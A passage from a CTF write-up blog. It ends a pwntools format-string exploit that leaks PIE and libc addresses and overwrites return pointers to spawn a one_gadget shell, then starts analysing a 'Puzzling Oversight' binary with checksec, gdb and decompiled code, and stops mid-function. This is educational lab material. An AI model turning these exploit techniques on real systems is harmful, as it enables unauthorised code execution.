</span></span><span class="line"><span class="cl">    <span class="c1"># The LSB of set() line which do &#39;CALL go&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">call_go_lsb</span> <span class="o">=</span> <span class="mh">0xed</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Payload notes:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Overwrite the LSB of saved rbp of ready() to point to the saved return pointer of go()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Overwrite the LSB of saved return pointer of go() to set()+13 (so that it will call go() again)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Also try to leak the pie base, libc base, and LSB of the stack address</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># After executing the payload, if our bruteforced lsb is correct, we will back to the go() function again</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;%c%c%c%c%c%c%</span><span class="si">{</span><span class="n">bruteforce_stack_lsb</span><span class="o">-</span><span class="mi">6</span><span class="si">}</span><span class="s1">x%hhn%</span><span class="si">{</span><span class="n">call_go_lsb</span><span class="o">-</span><span class="n">bruteforce_stack_lsb</span><span class="si">}</span><span class="s1">x%hhn||%6$p.%7$p.%13$p&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;First payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;||&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">leaked_pie</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">leaked_libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leaked pie : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_pie</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leaked libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Stack addr : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">stack_addr</span> <span class="o">!=</span> <span class="mh">0x40</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Re-init connection</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_pie</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;set&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">18</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">243</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Pie base   : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Libc base  : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">win_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xe3b01</span> <span class="c1"># rdx and r15 null via one_gadget</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Libc win  : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">win_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Second loop payload notes:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># From the first loop, we already have gadget to overwrite the saved return pointer of go(), stored inside</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># the saved rbp of the ready() function.</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Now, the detail of the payload:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Overwrite the LSB of saved rbp of set() the LSB of the stack address of the saved return pointer of main()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Overwrite the LSB of saved return pointer of go() to set()+13 with our crafter gadget from the first loop</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Overwrite first and second LSB of saved return pointer of main() to our win address (shell via one_gadget)</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span> <span class="o">=</span> <span class="n">stack_addr</span><span class="o">+</span><span class="mh">0x28</span> <span class="o">-</span> <span class="n">total</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">+=</span> <span class="n">s1</span>
</span></span><span class="line"><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="mh">0xed</span> <span class="o">-</span> <span class="n">total</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">+=</span> <span class="n">s2</span>
</span></span><span class="line"><span class="cl">    <span class="n">s3</span> <span class="o">=</span> <span class="p">(</span><span class="n">win_addr</span> <span class="o">%</span> <span class="mh">0x10000</span><span class="p">)</span><span class="o">-</span><span class="n">total</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;%c%c%c%c%</span><span class="si">{</span><span class="n">s1</span><span class="si">}</span><span class="s1">x%hhn%</span><span class="si">{</span><span class="n">s2</span><span class="si">}</span><span class="s1">x%10$hhn%</span><span class="si">{</span><span class="n">s3</span><span class="si">}</span><span class="s1">x%8$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Second payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Third loop notes:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Overwrite the LSB of saved rbp of set() to point to the saved return pointer of main() + 2 (Because we have overwritten two bytes)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># - Overwrite the third LSB of saved return pointer of main() with the third LSB of our shell address</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Now the main() will ret to shell</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span> <span class="o">=</span> <span class="n">stack_addr</span><span class="o">+</span><span class="mh">0x28</span><span class="o">+</span><span class="mi">2</span><span class="o">-</span><span class="n">total</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">+=</span> <span class="n">s1</span>
</span></span><span class="line"><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="p">((</span><span class="n">win_addr</span><span class="o">//</span> <span class="mh">0x10000</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span><span class="o">-</span><span class="n">total</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(((</span><span class="n">win_addr</span><span class="o">//</span> <span class="mh">0x10000</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;%c%c%c%c%</span><span class="si">{</span><span class="n">s1</span><span class="si">}</span><span class="s1">x%hhn%</span><span class="si">{</span><span class="n">s2</span><span class="si">}</span><span class="s1">x%8$hhn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Third payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/SCFsZzE.png"
        data-srcset="https://i.imgur.com/SCFsZzE.png, https://i.imgur.com/SCFsZzE.png 1.5x, https://i.imgur.com/SCFsZzE.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/SCFsZzE.png"
        title="https://i.imgur.com/SCFsZzE.png" /></p>
<blockquote>
<p><code>Flag: maple{F0wm47_57w1ng_3xpl01t_UwU}</code></p>
</blockquote>
<h2 id="puzzling-oversight">Puzzling Oversight</h2>
<p>We were given a binary called <code>puzzling-oversight</code> and a <code>Dockerfile</code>. Reading through the <code>Dockerfile</code>, the challenge was running under Ubuntu 22.04.</p>
<h3 id="initial-analysis-1">Initial Analysis</h3>
<p>Let&rsquo;s start by <code>checksec</code> the binary first.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
</span></span></code></pre></td></tr></table>
</div>
</div><p>Hmm RWX segments? Let&rsquo;s try to run the binary in gdb and check its memory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  vmmap
</span></span><span class="line"><span class="cl">[ Legend:  Code | Heap | Stack ]
</span></span><span class="line"><span class="cl">Start              End                Offset             Perm Path
</span></span><span class="line"><span class="cl">0x00555f0e89f000 0x00555f0e8a0000 0x00000000000000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight
</span></span><span class="line"><span class="cl">0x00555f0e8a0000 0x00555f0e8a1000 0x00000000001000 r-x /home/chovid99/ctf/puzzling/puzzling-oversight
</span></span><span class="line"><span class="cl">0x00555f0e8a1000 0x00555f0e8a2000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight
</span></span><span class="line"><span class="cl">0x00555f0e8a2000 0x00555f0e8a3000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight
</span></span><span class="line"><span class="cl">0x00555f0e8a3000 0x00555f0e8a4000 0x00000000003000 rwx /home/chovid99/ctf/puzzling/puzzling-oversight
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah, turn out the <code>.bss</code> is executable.</p>
<p>Let&rsquo;s try to run the given binary first so that we gain some knowledge about it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./puzzling-oversight
</span></span><span class="line"><span class="cl">Welcome to the Number Flipper(TM) game v7.27!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">1 - play the game
</span></span><span class="line"><span class="cl">2 - display how to play this game
</span></span><span class="line"><span class="cl">3 - display game stats
</span></span><span class="line"><span class="cl">4 - quit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; 2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">How to play this game:
</span></span><span class="line"><span class="cl">You are given 8 random hexadecimal numbers, which you can increment by any amount (it will wrap around if it&#39;s too big);
</span></span><span class="line"><span class="cl">However, the catch is doing so also affects the numbers directly next to it!
</span></span><span class="line"><span class="cl">Your goal is to flip all the numbers to 0s.
</span></span><span class="line"><span class="cl">That&#39;s it - simple, right?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">1 - play the game
</span></span><span class="line"><span class="cl">2 - display how to play this game
</span></span><span class="line"><span class="cl">3 - display game stats
</span></span><span class="line"><span class="cl">4 - quit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; 3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">You have won 0 times in the current session. Keep going!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">1 - play the game
</span></span><span class="line"><span class="cl">2 - display how to play this game
</span></span><span class="line"><span class="cl">3 - display game stats
</span></span><span class="line"><span class="cl">4 - quit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Board: 4b40 6451 55f4 d4f4 3c8f d13f 76f4 a891
</span></span><span class="line"><span class="cl">Your move (0 to quit) &gt; 3
</span></span><span class="line"><span class="cl">Increment how much? &gt; 1
</span></span><span class="line"><span class="cl">Board: 4b40 6452 55f5 d4f5 3c8f d13f 76f4 a891
</span></span><span class="line"><span class="cl">Your move (0 to quit) &gt; 0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Seeing through the interaction, the first menu is the only menu that can we use to write something to the memory. The rest isn&rsquo;t useful. And based on the printed rules, we can see that:</p>
<ul>
<li>Each time we choose an index called <code>idx</code> to be incremented, the value stored in <code>idx-1</code> and <code>idx+1</code> will be incremented also.</li>
<li>Seems like, the maximum value per index is <code>0xffff</code>, and it will wrap around when the value gets bigger than that.</li>
</ul>
<p>Let&rsquo;s start disassembling the binary. The binary method was stripped, but I&rsquo;ve renamed it to make it clearer.</p>
<p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="nf">alarm</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">_DAT_00104060</span> <span class="o">=</span> <span class="n">menu_play</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_DAT_00104068</span> <span class="o">=</span> <span class="n">menu_rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_DAT_00104070</span> <span class="o">=</span> <span class="n">menu_stats</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_DAT_00104078</span> <span class="o">=</span> <span class="n">menu_quit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the Number Flipper(TM) game v7.27!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Options:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1 - play the game&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2 - display how to play this game&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3 - display game stats&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4 - quit</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">read_input</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">))();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the main menu, notice that:</p>
<ul>
<li>Each of the menu function handler&rsquo;s pointers is stored under the <code>.bss</code> section</li>
<li>During each input in the main menu, the <code>main</code> will call the stored pointer inside the <code>.bss</code> variables based on the input.</li>
</ul>
<p>We just need to check the first menu, because it&rsquo;s the only important menu that needs to be audited.</p>
<p><strong>main_play</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu_play</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">time_t</span> <span class="n">tVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_38</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_34</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">tVar2</span> <span class="o">=</span> <span class="nf">time</span><span class="p">((</span><span class="kt">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">tVar2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_38</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00104050</span><span class="p">)[</span><span class="n">local_38</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_38</span> <span class="o">=</span> <span class="n">local_38</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">((((</span><span class="n">DAT_00104050</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">DAT_00104054</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="n">DAT_00104058</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="n">DAT_0010405c</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Board: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_34</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">local_34</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%04x &#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00104050</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="n">local_34</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="n">local_34</span> <span class="o">=</span> <span class="n">local_34</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Your move (0 to quit) &gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
